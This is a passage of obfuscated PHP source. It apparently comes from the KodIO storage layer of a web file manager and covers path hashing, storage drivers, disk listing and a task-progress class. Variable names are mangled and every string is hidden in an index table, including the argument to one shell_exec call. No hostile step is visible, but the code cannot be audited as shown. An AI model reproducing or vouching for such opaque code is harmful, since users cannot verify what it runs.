: IO::info($ÔõªÄäø); $Ø÷¬ï§× = _get($ñ´Á¬¾, $í™µúêÄ[1476], $í™µúêÄ[12]); if (!$Ø÷¬ï§× && isset($ñ´Á¬¾[$í™µúêÄ[557]])) { $Ø÷¬ï§× = $ñ´Á¬¾[$í™µúêÄ[557]]; } if (!$Ø÷¬ï§× && isset($ñ´Á¬¾[$í™µúêÄ[235]])) { $Ø÷¬ï§× = trim($ñ´Á¬¾[$í™µúêÄ[235]], $í™µúêÄ[118]); } if ($Ø÷¬ï§×) { return $Ø÷¬ï§×; } if (!$Ø÷¬ï§× && isset($ñ´Á¬¾[$í™µúêÄ[191]]) && $ñ´Á¬¾[$í™µúêÄ[191]]) { $ñ´Á¬¾ = IO::info(KodIO::make($ñ´Á¬¾[$í™µúêÄ[191]])); $Ø÷¬ï§× = _get($ñ´Á¬¾, $í™µúêÄ[1476], $í™µúêÄ[12]); if (!$Ø÷¬ï§× && isset($ñ´Á¬¾[$í™µúêÄ[557]])) { $Ø÷¬ï§× = $ñ´Á¬¾[$í™µúêÄ[557]]; } } $£Àïîùª = md5($ñ´Á¬¾[$í™µúêÄ[87]] . $ñ´Á¬¾[$í™µúêÄ[79]] . $ñ´Á¬¾[$í™µúêÄ[88]]); $„Û´¥ˆ² = $£Àïîùª . $í™µúêÄ[1477]; $Ø÷¬ï§× = $Ø÷¬ï§× ? $Ø÷¬ï§× : Cache::get($„Û´¥ˆ²); if (!$Ø÷¬ï§× && $ø¢–Š) { $Ø÷¬ï§× = IO::hashSimple($ñ´Á¬¾[$í™µúêÄ[87]]); Cache::set($„Û´¥ˆ², $Ø÷¬ï§× ? $Ø÷¬ï§× : $£Àïîùª, 3600 * 24 * 30); } return $Ø÷¬ï§× ? $Ø÷¬ï§× : $£Àïîùª; } public static function hashPathSafe($åâ’¼ˆ, $ÈÄåÍÄ = false) { $Ü¹õ÷¢œ =& $_SERVER[µÅ˜º…æ]; $™¶Š˜†³ = self::hashPath($åâ’¼ˆ, $ÈÄåÍÄ); return md5($™¶Š˜†³ . $Ü¹õ÷¢œ[1478] . Model($Ü¹õ÷¢œ[872])->get($Ü¹õ÷¢œ[873])); } public static function initSystemPath() { $ÆŸ¶’ª™ =& $_SERVER[µÅ˜º…æ]; if (defined($ÆŸ¶’ª™[1479])) { return; } define($ÆŸ¶’ª™[1479], self::systemPath($ÆŸ¶’ª™[189])); define($ÆŸ¶’ª™[1480], self::systemPath($ÆŸ¶’ª™[1481])); define($ÆŸ¶’ª™[1482], self::systemPath($ÆŸ¶’ª™[1483])); define($ÆŸ¶’ª™[1484], self::systemPath($ÆŸ¶’ª™[1485])); IOHistory::bindEvent(); } public static function systemPath($™ƒˆàÉå) { $Ã±À§àŸ =& $_SERVER[µÅ˜º…æ]; $Å…‡æÁ÷ = $Ã±À§àŸ[1486] . ucfirst($™ƒˆàÉå); $ÅÔš¸ÏÅ = Model($Ã±À§àŸ[872])->get($Å…‡æÁ÷); if ($ÅÔš¸ÏÅ) { return $ÅÔš¸ÏÅ; } if ($™ƒˆàÉå == $Ã±À§àŸ[189]) { $ÅÔš¸ÏÅ = self::make(Model($Ã±À§àŸ[932])->systemRootPathAdd($Ã±À§àŸ[628])); } else { $ÅÔš¸ÏÅ = self::systemPath($Ã±À§àŸ[189]); $ôŠÖıÑÇ = self::sourceID($ÅÔš¸ÏÅ); $ÅÔš¸ÏÅ = self::make(Model($Ã±À§àŸ[932])->mkdir($ôŠÖıÑÇ, $™ƒˆàÉå)); } Model($Ã±À§àŸ[872])->set($Å…‡æÁ÷, $ÅÔš¸ÏÅ); return $ÅÔš¸ÏÅ; } public static function systemFolder($½‰Ñ«‘) { $Ş§Õ¦û– = IO_PATH_SYSTEM_SOURCE . $½‰Ñ«‘; $¼”À•¨ô = Cache::get($Ş§Õ¦û–); if (!$¼”À•¨ô) { $¼ÉÃùÑÍ = IO::infoFullSimple($Ş§Õ¦û–); if (!$¼ÉÃùÑÍ) { $¼”À•¨ô = IO::mkdir($Ş§Õ¦û–, REPEAT_SKIP); } else { $¼”À•¨ô = $¼ÉÃùÑÍ[$_SERVER[µÅ˜º…æ][87]]; } Cache::set($Ş§Õ¦û–, $¼”À•¨ô, 3600 * 10); } return $¼”À•¨ô; } public static function defaultDriver() { return Model($_SERVER[µÅ˜º…æ][867])->defaultDriver(); } public static function defaultDriverInit() { $µííÁ–‘ =& $_SERVER[µÅ˜º…æ]; static $ùíÍğÛ = false; if ($ùíÍğÛ) { return $ùíÍğÛ; } $§éÑëƒ­ = self::defaultDriver(); $ùíÍğÛ = IO::init($µííÁ–‘[1487] . $§éÑëƒ­[$µííÁ–‘[487]] . $µííÁ–‘[1475]); return $ùíÍğÛ; } public static function fileTypeList() { $Àâ›…î· =& $_SERVER[µÅ˜º…æ]; $ùùÜŠ¢Æ = $GLOBALS[$Àâ›…î·[6]][$Àâ›…î·[1488]]; foreach ($ùùÜŠ¢Æ as $ó à€š => $œÔˆÖ™ï) { $â¿äø–ç = $Àâ›…î·[1489] . $ó à€š; $î¦ñ¤„ş = LNG($â¿äø–ç); if ($â¿äø–ç != $î¦ñ¤„ş) { $ùùÜŠ¢Æ[$ó à€š][$Àâ›…î·[32]] = $î¦ñ¤„ş; } } return $ùùÜŠ¢Æ; } public static function ioFileDriverGet($æ”÷ù˜ = '') { $Çñü¾‰â =& $_SERVER[µÅ˜º…æ]; static $½šûãıî = array(); static $Ü€®õã = array(); static $¤›çŒ² = array(); static $âƒ”º”Ã = false; if ($âƒ”º”Ã === !1) { $âƒ”º”Ã = array($Çñü¾‰â[598] => array(), $Çñü¾‰â[684] => array()); $Ó°²Œ©¥ = Model($Çñü¾‰â[1490])->get(!1, $Çñü¾‰â[1491]); foreach ($Ó°²Œ©¥ as $ŸÉŒæË¶ => $ƒ¦Â˜ò³) { if (!$ƒ¦Â˜ò³ || $ƒ¦Â˜ò³ == $Çñü¾‰â[12]) { continue; } if (strstr($ŸÉŒæË¶, $Çñü¾‰â[1492])) { $…ˆ¥‚¤ƒ = str_replace($Çñü¾‰â[1492], $Çñü¾‰â[12], $ŸÉŒæË¶); $âƒ”º”Ã[$Çñü¾‰â[598]][$…ˆ¥‚¤ƒ] = $ƒ¦Â˜ò³; } else { if (strstr($ŸÉŒæË¶, $Çñü¾‰â[1493])) { $…ˆ¥‚¤ƒ = str_replace($Çñü¾‰â[1493], $Çñü¾‰â[12], $ŸÉŒæË¶); $âƒ”º”Ã[$Çñü¾‰â[684]][$…ˆ¥‚¤ƒ] = $ƒ¦Â˜ò³; } } } } $ôşç€ÅÍ = self::defaultDriver(); if (!$æ”÷ù˜ || !$âƒ”º”Ã[$Çñü¾‰â[598]] && !$âƒ”º”Ã[$Çñü¾‰â[684]]) { return $ôşç€ÅÍ; } $îê‘ˆŠ‚ = self::getPathSourceID($æ”÷ù˜); if (!$îê‘ˆŠ‚) { return $ôşç€ÅÍ; } if (isset($½šûãıî[$îê‘ˆŠ‚])) { return $½šûãıî[$îê‘ˆŠ‚]; } $Ñà¶Êµ÷ = Model($Çñü¾‰â[932])->sourceInfo($îê‘ˆŠ‚); $‡ˆĞÖçù = $Ñà¶Êµ÷[$Çñü¾‰â[589]]; $†‚ ÓÅì = array(); if (!$Ñà¶Êµ÷) { return $ôşç€ÅÍ; } if ($Ñà¶Êµ÷[$Çñü¾‰â[188]] == $Çñü¾‰â[91]) { if (isset($¤›çŒ²[$‡ˆĞÖçù])) { return $¤›çŒ²[$‡ˆĞÖçù]; } if (isset($âƒ”º”Ã[$Çñü¾‰â[684]][$‡ˆĞÖçù])) { $œÎ˜­Ã” = Model($Çñü¾‰â[867])->driverInfo($âƒ”º”Ã[$Çñü¾‰â[684]][$‡ˆĞÖçù]); $ôşç€ÅÍ = $œÎ˜­Ã” ? $œÎ˜­Ã” : $ôşç€ÅÍ; $¤›çŒ²[$‡ˆĞÖçù] = $ôşç€ÅÍ; $½šûãıî[$îê‘ˆŠ‚] = $ôşç€ÅÍ; return $ôşç€ÅÍ; } $†‚ ÓÅì = self::groupParentUser($‡ˆĞÖçù); } else { if ($Ñà¶Êµ÷[$Çñü¾‰â[188]] == $Çñü¾‰â[524]) { $à”Ï Ó« = Model($Çñü¾‰â[1494])->getInfo($‡ˆĞÖçù); if ($à”Ï Ó«) { $†‚ ÓÅì = explode($Çñü¾‰â[50], trim($à”Ï Ó«[$Çñü¾‰â[604]], $Çñü¾‰â[50])); $†‚ ÓÅì = array_remove_value($†‚ ÓÅì, $Çñü¾‰â[228]); $†‚ ÓÅì[] = $‡ˆĞÖçù; $†‚ ÓÅì = array_reverse($†‚ ÓÅì); } } } foreach ($†‚ ÓÅì as $é˜áïûü) { if (!isset($âƒ”º”Ã[$Çñü¾‰â[598]][$é˜áïûü])) { continue; } if (isset($Ü€®õã[$é˜áïûü])) { return $Ü€®õã[$é˜áïûü]; } $œÎ˜­Ã” = Model($Çñü¾‰â[867])->driverInfo($âƒ”º”Ã[$Çñü¾‰â[598]][$é˜áïûü]); $ôşç€ÅÍ = $œÎ˜­Ã” ? $œÎ˜­Ã” : $ôşç€ÅÍ; $Ü€®õã[$é˜áïûü] = $ôşç€ÅÍ; break; } if ($Ñà¶Êµ÷[$Çñü¾‰â[188]] == $Çñü¾‰â[91]) { $¤›çŒ²[$‡ˆĞÖçù] = $ôşç€ÅÍ; } $½šûãıî[$îê‘ˆŠ‚] = $ôşç€ÅÍ; return $ôşç€ÅÍ; } private static function getPathSourceID($›ç÷’ã“) { $èµ¿Ö·Ÿ =& $_SERVER[µÅ˜º…æ]; static $Ôşâ·ı = array(); if (!$›ç÷’ã“) { return $èµ¿Ö·Ÿ[12]; } $×£÷’Şó = substr($›ç÷’ã“, 0, strlen($èµ¿Ö·Ÿ[498])) == $èµ¿Ö·Ÿ[498]; $­¾Úú•Ñ = substr($›ç÷’ã“, 0, strlen($èµ¿Ö·Ÿ[1461])) == $èµ¿Ö·Ÿ[1461]; $„°ÓµöØ = substr($›ç÷’ã“, 0, strlen($èµ¿Ö·Ÿ[1462])) == $èµ¿Ö·Ÿ[1462]; if (!$×£÷’Şó && !$­¾Úú•Ñ && !$„°ÓµöØ) { return $èµ¿Ö·Ÿ[12]; } $Ô’ÍÁÉ = self::parse($›ç÷’ã“); $Í£ÅÁ“Ê = $Ô’ÍÁÉ[$èµ¿Ö·Ÿ[1358]]; if ($×£÷’Şó) { return $Ô’ÍÁÉ[$èµ¿Ö·Ÿ[487]]; } if (isset($Ôşâ·ı[$Í£ÅÁ“Ê])) { $Í²ÊÕé = $Ôşâ·ı[$Í£ÅÁ“Ê]; } else { $Í²ÊÕé = IO::init($Í£ÅÁ“Ê); $Ôşâ·ı[$Í£ÅÁ“Ê] = $Í²ÊÕé; } if (isset($Í²ÊÕé->pathParse[$èµ¿Ö·Ÿ[1361]])) { return $Í²ÊÕé->pathParse[$èµ¿Ö·Ÿ[1361]]; } return $èµ¿Ö·Ÿ[12]; } private static function groupParentUser($ÕÂ–¥¢¨) { $•êœ­±Ë =& $_SERVER[µÅ˜º…æ]; $À¬“¹÷È = Model($•êœ­±Ë[617])->getInfo($ÕÂ–¥¢¨); if (!$À¬“¹÷È) { return array(); } $–Î¨·ó± = array_to_keyvalue($À¬“¹÷È[$•êœ­±Ë[1495]], $•êœ­±Ë[12], $•êœ­±Ë[1496]); $ËøªÃŠ± = array(); foreach ($À¬“¹÷È[$•êœ­±Ë[1495]] as $¥ÖØÚ«) { $ËøªÃŠ±[] = $¥ÖØÚ«[$•êœ­±Ë[1496]]; $Ää“´èæ = explode($•êœ­±Ë[50], trim($¥ÖØÚ«[$•êœ­±Ë[604]], $•êœ­±Ë[50])); $Ää“´èæ = array_remove_value($Ää“´èæ, $•êœ­±Ë[228]); $Ää“´èæ = array_reverse($Ää“´èæ); $ËøªÃŠ± = array_merge($ËøªÃŠ±, $Ää“´èæ); } return array_unique($ËøªÃŠ±); } public static function diskList($¯ôå×¿· = true) { $ÆÍÛ¹€Û = $_SERVER[µÅ˜º…æ][1497]; if ($¯ôå×¿·) { $òü€ÉÇ¶ = Cache::get($ÆÍÛ¹€Û); if (is_array($òü€ÉÇ¶)) { return $òü€ÉÇ¶; } } $òü€ÉÇ¶ = self::diskListGet(); Cache::set($ÆÍÛ¹€Û, $òü€ÉÇ¶, 60); return $òü€ÉÇ¶; } public static function diskListGet() { $Êì€Ğ‹ =& $_SERVER[µÅ˜º…æ]; $”Öâì½Â = array(); if ($GLOBALS[$Êì€Ğ‹[6]][$Êì€Ğ‹[1498]] == $Êì€Ğ‹[1499]) { $ö¹ÓŸî‚ = $Êì€Ğ‹[1500]; for ($«³¡ì±Û = 0; $«³¡ì±Û < strlen($ö¹ÓŸî‚); $«³¡ì±Û++) { $èÊ”Ö˜Ò = $ö¹ÓŸî‚[$«³¡ì±Û] . $Êì€Ğ‹[1501]; if (file_exists($èÊ”Ö˜Ò)) { $”Öâì½Â[] = $èÊ”Ö˜Ò; } } return $”Öâì½Â; } if (!function_exists($Êì€Ğ‹[98])) { $”Öâì½Â[] = $Êì€Ğ‹[991]; return $”Öâì½Â; } $ò°×ÕğÛ = explode($Êì€Ğ‹[285], shell_exec($Êì€Ğ‹[1502])); array_shift($ò°×ÕğÛ); array_pop($ò°×ÕğÛ); $´¼×ùôş = array($Êì€Ğ‹[1503], $Êì€Ğ‹[1504], $Êì€Ğ‹[1505], $Êì€Ğ‹[1506], $Êì€Ğ‹[1507], $Êì€Ğ‹[1508], $Êì€Ğ‹[1509], $Êì€Ğ‹[1510]); foreach ($ò°×ÕğÛ as $’‡òà) { $‹€™İ­´ = preg_split($Êì€Ğ‹[1511], $’‡òà); $èÊ”Ö˜Ò = $‹€™İ­´[count($‹€™İ­´) - 1]; if (!strstr($‹€™İ­´[0], $Êì€Ğ‹[1512]) || !$èÊ”Ö˜Ò) { continue; } $¶ŠääÚû = rtrim($èÊ”Ö˜Ò, $Êì€Ğ‹[8]) . $Êì€Ğ‹[8]; $”Öâì½Â[] = $¶ŠääÚû; } return $”Öâì½Â; } public static function isSameDisk($”ıä’Áå, $Èçñ©÷) { $œñ¾ï» =& $_SERVER[µÅ˜º…æ]; if ($GLOBALS[$œñ¾ï»[6]][$œñ¾ï»[1498]] == $œñ¾ï»[1499]) { return strtolower(substr($”ıä’Áå, 0, 1)) == strtolower(substr($Èçñ©÷, 0, 1)); } $æÉº¡ø = stat($”ıä’Áå); $—ø¡¯â× = stat($Èçñ©÷); if ($æÉº¡ø === !1 || $—ø¡¯â× === !1) { return !1; } return $æÉº¡ø[$œñ¾ï»[1513]] === $—ø¡¯â×[$œñ¾ï»[1513]]; $ÒœêÍò¸ = self::diskList(); $¸ä§ƒï€ = !1; $×õŸ¬Åë = !1; sort($ÒœêÍò¸); $ÒœêÍò¸ = array_reverse($ÒœêÍò¸); $”ıä’Áå = rtrim($”ıä’Áå, $œñ¾ï»[8]) . $œñ¾ï»[8]; $Èçñ©÷ = rtrim($Èçñ©÷, $œñ¾ï»[8]) . $œñ¾ï»[8]; foreach ($ÒœêÍò¸ as $ğ·Ïíô—) { $¸İ•Œå‚ = strlen($ğ·Ïíô—); if (!$¸ä§ƒï€ && substr($”ıä’Áå, 0, $¸İ•Œå‚) == $ğ·Ïíô—) { $¸ä§ƒï€ = $ğ·Ïíô—; } if (!$×õŸ¬Åë && substr($Èçñ©÷, 0, $¸İ•Œå‚) == $ğ·Ïíô—) { $×õŸ¬Åë = $ğ·Ïíô—; } if ($¸ä§ƒï€ && $×õŸ¬Åë) { break; } } return $¸ä§ƒï€ === $×õŸ¬Åë; } public static function transferType($ÜÕ÷¿’ß, $õæÛ¶Ó) { $çœÑùÙà =& $_SERVER[µÅ˜º…æ]; $ì‡ öãº = self::driverType($ÜÕ÷¿’ß); $’ÊÂĞÇÛ = self::driverType($õæÛ¶Ó); if ($ì‡ öãº[$çœÑùÙà[33]] == $’ÊÂĞÇÛ[$çœÑùÙà[33]] && $ì‡ öãº[$çœÑùÙà[1514]] == $’ÊÂĞÇÛ[$çœÑùÙà[1514]]) { return $çœÑùÙà[1515]; } if ($ì‡ öãº[$çœÑùÙà[33]] == $çœÑùÙà[1033] && $’ÊÂĞÇÛ[$çœÑùÙà[33]] == $çœÑùÙà[106]) { return $çœÑùÙà[1386]; } if ($ì‡ öãº[$çœÑùÙà[33]] == $çœÑùÙà[106] && $’ÊÂĞÇÛ[$çœÑùÙà[33]] == $çœÑùÙà[1033]) { return $çœÑùÙà[107]; } return $çœÑùÙà[1516]; } public static function driverType($ÍÈÆ¥¿) { $©¼¾ ûË =& $_SERVER[µÅ˜º…æ]; $Ÿƒ³ªœ‹ = str_replace($©¼¾ ûË[1517], $©¼¾ ûË[12], strtolower($ÍÈÆ¥¿->getType())); if ($Ÿƒ³ªœ‹ == $©¼¾ ûË[857] || $Ÿƒ³ªœ‹ == $©¼¾ ûË[1518] || $Ÿƒ³ªœ‹ == $©¼¾ ûË[1519]) { $ä€æ°û = self::ioFileDriverGet($©¼¾ ûË[498] . $ÍÈÆ¥¿->pathParse[$©¼¾ ûË[1361]] . $©¼¾ ûË[402]); $ÍÈÆ¥¿ = IO::init($©¼¾ ûË[1487] . $ä€æ°û[$©¼¾ ûË[487]] . $©¼¾ ûË[1475]); } else { if ($Ÿƒ³ªœ‹ == $©¼¾ ûË[1395] || $Ÿƒ³ªœ‹ == $©¼¾ ûË[1520]) { $ÍÈÆ¥¿ = IO::init($ÍÈÆ¥¿->pathParse[$©¼¾ ûË[1338]]); } } $éåáÔÇÉ = $ÍÈÆ¥¿->path; $Ÿƒ³ªœ‹ = str_replace($©¼¾ ûË[1517], $©¼¾ ûË[12], strtolower($ÍÈÆ¥¿->getType())); if ($Ÿƒ³ªœ‹ == $©¼¾ ûË[106]) { return array($©¼¾ ûË[33] => $©¼¾ ûË[106], $©¼¾ ûË[1514] => $©¼¾ ûË[12], $©¼¾ ûË[87] => $éåáÔÇÉ, $©¼¾ ûË[96] => $ÍÈÆ¥¿); } return array($©¼¾ ûË[33] => $©¼¾ ûË[1033], $©¼¾ ûË[1514] => $ÍÈÆ¥¿->pathDriver, $©¼¾ ûË[87] => $éåáÔÇÉ, $©¼¾ ûË[96] => $ÍÈÆ¥¿); } public static function pathDriverType($õ’Ã³€) { return $õ’Ã³€ ? self::driverType(IO::init($õ’Ã³€)) : !1; } public static function pathDriverLocal($Ç—Œ‘ë) { $Šûƒ‹Î =& $_SERVER[µÅ˜º…æ]; $©Ìè…ÉÎ = $Ç—Œ‘ë ? self::driverType(IO::init($Ç—Œ‘ë)) : !1; return strtolower($©Ìè…ÉÎ[$Šûƒ‹Î[33]]) == $Šûƒ‹Î[106] ? !0 : !1; } public static function allowCover($³Û×‘·Ì, $„‡İ¦™¢ = true) { $şÇâ£“å =& $_SERVER[µÅ˜º…æ]; if (is_string($³Û×‘·Ì)) { $³Û×‘·Ì = IO::info($³Û×‘·Ì); } if (!$³Û×‘·Ì || $³Û×‘·Ì[$şÇâ£“å[33]] == $şÇâ£“å[78] || $³Û×‘·Ì[$şÇâ£“å[79]] <= 100) { return !1; } if (isset($³Û×‘·Ì[$şÇâ£“å[1521]]) || !$³Û×‘·Ì[$şÇâ£“å[87]]) { return !1; } if (isset($³Û×‘·Ì[$şÇâ£“å[232]]) && !$³Û×‘·Ì[$şÇâ£“å[232]]) { return !1; } static $×Ü÷Ÿ¦ = false; if (!$×Ü÷Ÿ¦ || !$„‡İ¦™¢) { $‰êÉé¿ = self::driverType(IO::init($³Û×‘·Ì[$şÇâ£“å[87]])); $ÈŸ²¹®¢ = $‰êÉé¿[$şÇâ£“å[96]]; $×Ü÷Ÿ¦ = $şÇâ£“å[194]; if ($‰êÉé¿[$şÇâ£“å[33]] == $şÇâ£“å[106]) { $×Ü÷Ÿ¦ = $şÇâ£“å[1522]; } if ($‰êÉé¿[$şÇâ£“å[96]] && is_array($‰êÉé¿[$şÇâ£“å[96]]->config)) { $Áãîíû = $‰êÉé¿[$şÇâ£“å[96]]->config; if (isset($Áãîíû[$şÇâ£“å[1523]]) && $Áãîíû[$şÇâ£“å[1523]]) { $×Ü÷Ÿ¦ = $şÇâ£“å[1522]; } } $Ó§†‡ª  = KodIO::defaultDriver(); if (strtolower($Ó§†‡ª [$şÇâ£“å[96]]) == $şÇâ£“å[106] && is_array($Ó§†‡ª [$şÇâ£“å[6]])) { $ø—õ³‡ä = $Ó§†‡ª [$şÇâ£“å[6]][$şÇâ£“å[1370]]; if (substr($ø—õ³‡ä, 0, 2) == $şÇâ£“å[1524]) { $ø—õ³‡ä = str_replace($şÇâ£“å[1524], BASIC_PATH, $ø—õ³‡ä); } $ø—õ³‡ä = str_replace($şÇâ£“å[254], $şÇâ£“å[8], $ø—õ³‡ä); if (substr($³Û×‘·Ì[$şÇâ£“å[87]], 0, strlen($ø—õ³‡ä)) == $ø—õ³‡ä) { $×Ü÷Ÿ¦ = $şÇâ£“å[194]; } } } return $×Ü÷Ÿ¦ == $şÇâ£“å[1522] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ßÀÈıÇ) { parent::__construct($ßÀÈıÇ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto aŞ·½Šáï; c‚™‚°Êˆõ: class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\165\156\156\151\156\147"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($“¬ğïœ, $Ş¦œ¤™Ÿ = '', $©¥ßƒ‘à = 0, $Úî×éî¯ = '') { $®ÃÆ Œç =& $_SERVER[µÅ˜º…æ]; if (self::get($“¬ğïœ)) { return; } $this->task = array($®ÃÆ Œç[487] => $“¬ğïœ, $®ÃÆ Œç[1593] => USER_ID, $®ÃÆ Œç[1865] => $Úî×éî¯, $®ÃÆ Œç[540] => $®ÃÆ Œç[12], $®ÃÆ Œç[33] => $Ş¦œ¤™Ÿ, $®ÃÆ Œç[1235] => $®ÃÆ Œç[12], $®ÃÆ Œç[1233] => $©¥ßƒ‘à, $®ÃÆ Œç[1976] => 0, $®ÃÆ Œç[1977] => 0, $®ÃÆ Œç[1978] => 0, $®ÃÆ Œç[1979] => timeFloat(), $®ÃÆ Œç[1980] => 0, $®ÃÆ Œç[1981] => 0, $®ÃÆ Œç[1982] => 0, $®ÃÆ Œç[1983] => 0, $®ÃÆ Œç[849] => $®ÃÆ Œç[938]); $GLOBALS[$®ÃÆ Œç[1984]] = 1; Hook::bind($®ÃÆ Œç[1930], array($this, $®ÃÆ Œç[1985])); Hook::bind($®ÃÆ Œç[1986], array($this, $®ÃÆ Œç[1987])); $this->startAfter(); Hook::trigger($®ÃÆ Œç[1988], $this->task); $this->task[$®ÃÆ Œç[1981]] = timeFloat(); } public function end($ÒÌƒ¯ë = '') { $À«·ˆ¾ü =& $_SERVER[µÅ˜º…æ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$À«·ˆ¾ü[1981]]) { self::valueSet($this->task[$À«·ˆ¾ü[487]], !1); } $this->isEnd = !0; if ($ÒÌƒ¯ë) { $this->task[$À«·ˆ¾ü[540]] = $ÒÌƒ¯ë; } self::log($À«·ˆ¾ü[1989] . $this->task[$À«·ˆ¾ü[487]] . $À«·ˆ¾ü[1990] . sprintf($À«·ˆ¾ü[1007], timeFloat() - $this->task[$À«·ˆ¾ü[1979]]) . $À«·ˆ¾ü[1991]); Hook::unbind($À«·ˆ¾ü[1930], array($this, $À«·ˆ¾ü[1985])); Hook::unbind($À«·ˆ¾ü[1986], array($this, $À«·ˆ¾ü[1987])); $this->endAfter(); $Œ¨ ‰Ÿ = $this->task; $this->task = !1; Hook::trigger($À«·ˆ¾ü[1992], $Œ¨ ‰Ÿ); } public function update($Ë·˜ÛòŠ = 0, $…é‹‹‰¡ = false) { $«¾ÔÆ‹ =& $_SERVER[µÅ˜º…æ]; $ÙãÌÔú =& $this->task; if (!$ÙãÌÔú) { return; } $ÙãÌÔú[$«¾ÔÆ‹[1976]] += $Ë·˜ÛòŠ; $ÙãÌÔú[$«¾ÔÆ‹[1980]] = timeFloat(); if ($ÙãÌÔú[$«¾ÔÆ‹[1233]]) { if ($ÙãÌÔú[$«¾ÔÆ‹[1233]] < $ÙãÌÔú[$«¾ÔÆ‹[1976]]) { $ÙãÌÔú[$«¾ÔÆ‹[1233]] = $ÙãÌÔú[$«¾ÔÆ‹[1976]]; } $¸Ô’ÎËä = timeFloat() - $ÙãÌÔú[$«¾ÔÆ‹[1979]] - $ÙãÌÔú[$«¾ÔÆ‹[1982]]; if ($¸Ô’ÎËä <= 0) { $¸Ô’ÎËä = 0.001; } $ÙãÌÔú[$«¾ÔÆ‹[1977]] = $ÙãÌÔú[$«¾ÔÆ‹[1976]] / $ÙãÌÔú[$«¾ÔÆ‹[1233]]; $ÙãÌÔú[$«¾ÔÆ‹[1978]] = $ÙãÌÔú[$«¾ÔÆ‹[1976]] / $¸Ô’ÎËä; if ($ÙãÌÔú[$«¾ÔÆ‹[1977]] > 0) { $ÙãÌÔú[$«¾ÔÆ‹[1983]] = $¸Ô’ÎËä * (1 - $ÙãÌÔú[$«¾ÔÆ‹[1977]]) / $ÙãÌÔú[$«¾ÔÆ‹[1977]]; } $ÙãÌÔú[$«¾ÔÆ‹[1983]] = $ÙãÌÔú[$«¾ÔÆ‹[1983]] <= 0 ? 0 : $ÙãÌÔú[$«¾ÔÆ‹[1983]]; } $this->updateAfter(); $şé§´‹Ê = 0.2; if (timeFloat() - $ÙãÌÔú[$«¾ÔÆ‹[1981]] < $şé§´‹Ê && !$…é‹‹‰¡) { return; } $¶ı–¨‘Ğ = self::get($ÙãÌÔú[$«¾ÔÆ‹[487]]); $¨µû™Ôà = $¶ı–¨‘Ğ[$«¾ÔÆ‹[849]]; if ($¨µû™Ôà == self::STATYS_KILL) { $§‘Åìî = array($«¾ÔÆ‹[1993] => LNG($«¾ÔÆ‹[1994]), $«¾ÔÆ‹[1403] => !1); Cache::set($«¾ÔÆ‹[1995] . $this->task[$«¾ÔÆ‹[487]], $§‘Åìî, 30); $this->onKill(); $this->end(); die; } else { if ($¨µû™Ôà == self::STATYS_STOP) { $Êı Àµ = 2; $¶ı–¨‘Ğ[$«¾ÔÆ‹[1982]] += $Êı Àµ; self::valueSet($ÙãÌÔú[$«¾ÔÆ‹[487]], $¶ı–¨‘Ğ); sleep($Êı Àµ); $this->update(); return; } } $ÙãÌÔú[$«¾ÔÆ‹[849]] = $¨µû™Ôà ? $¨µû™Ôà : $ÙãÌÔú[$«¾ÔÆ‹[849]]; $ÙãÌÔú[$«¾ÔÆ‹[1982]] = $¶ı–¨‘Ğ[$«¾ÔÆ‹[1982]] ? $¶ı–¨‘Ğ[$«¾ÔÆ‹[1982]] : 0; $ÙãÌÔú[$«¾ÔÆ‹[1981]] = timeFloat(); Hook::trigger($«¾ÔÆ‹[1996], $ÙãÌÔú); self::valueSet($ÙãÌÔú[$«¾ÔÆ‹[487]], $ÙãÌÔú); } public function onKillSet($­›§ ï£, $ß®Ö«È = array()) { $this->onKillCall = array($­›§ ï£, $ß®Ö«È); } public function onKill() { $¡íÁó—Ñ =& $_SERVER[µÅ˜º…æ]; self::log($¡íÁó—Ñ[1989] . $this->task[$¡íÁó—Ñ[487]] . $¡íÁó—Ñ[1997]); Hook::trigger($¡íÁó—Ñ[1998], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($–Áƒê»Ë) { $§¨°Ûˆ¶ =& $_SERVER[µÅ˜º…æ]; Cache::set($§¨°Ûˆ¶[1995] . $this->task[$§¨°Ûˆ¶[487]], $–Áƒê»Ë, 60); if (!is_array($–Áƒê»Ë) || !$–Áƒê»Ë[$§¨°Ûˆ¶[1403]]) { self::log($§¨°Ûˆ¶[1999] . json_encode($–Áƒê»Ë)); } return $–Áƒê»Ë; } public static function get($¨¢Æ”¾¸) { $Š“¿“Æ˜ =& $_SERVER[µÅ˜º…æ]; $´»¹ğ = self::valueGet($¨¢Æ”¾¸); if (is_array($´»¹ğ) && $´»¹ğ[$Š“¿“Æ˜[2000]]) { $·Æ¨ãµø = ActionApply($´»¹ğ[$Š“¿“Æ˜[2000]], array($´»¹ğ)); $´»¹ğ = is_array($·Æ¨ãµø) ? $·Æ¨ãµø : $´»¹ğ; } return $´»¹ğ; } public static function listData() { $èÁ«„™Ã = self::valueGet(); return array_sort_by($èÁ«„™Ã, $_SERVER[µÅ˜º…æ][1979], !0); } public static function kill($ª“ÒÙ©) { return self::changeStatus($ª“ÒÙ©, self::STATYS_KILL); } public static function stop($şÌÑ¦û‰) { return self::changeStatus($şÌÑ¦û‰, self::STATYS_STOP); } public static function restart($âú²µà») { return self::changeStatus($âú²µà», self::STATYS_RUNNING); } public static function killAll() { $×ü£‚½ =& $_SERVER[µÅ˜º…æ]; $¼„½ö¬ì = self::listData(); foreach ($¼„½ö¬ì as $ø³É€ï) { self::kill($ø³É€ï[$×ü£‚½[487]]); } sleep(2); foreach ($¼„½ö¬ì as $ø³É€ï) { self::valueSet($ø³É€ï[$×ü£‚½[487]], !1); } } private static function changeStatus($‚§ƒ–Şí, $Ÿı­úÛã) { $ÄµÎª¬ö =& $_SERVER[µÅ˜º…æ]; $œÕ€è¼ù = self::valueGet($‚§ƒ–Şí); if (!$œÕ€è¼ù) { return !1; } $œÕ€è¼ù[$ÄµÎª¬ö[849]] = $Ÿı­úÛã; self::valueSet($‚§ƒ–Şí, $œÕ€è¼ù); self::log($ÄµÎª¬ö[2001] . 